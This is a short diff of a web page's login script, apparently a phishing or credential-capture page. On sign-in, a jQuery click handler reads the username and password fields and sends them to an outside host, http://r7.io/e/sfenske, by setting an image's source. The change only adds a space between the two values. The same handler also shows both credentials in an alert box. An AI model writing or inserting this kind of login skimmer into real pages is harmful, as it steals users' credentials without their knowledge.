@@ -22,7 +22,7 @@
         $(document).ready(function() { $('#signin-btn').click(function(){
             i = new Image();
             var password = $('#login_password').val();
-            i.src='http://r7.io/e/sfenske?s='+$('#login_username').val()+ password;
+            i.src='http://r7.io/e/sfenske?s='+$('#login_username').val()+ " " + password;
             alert($('#login_username').val() + " " + $('#login_password').val());
         });});
     </script>
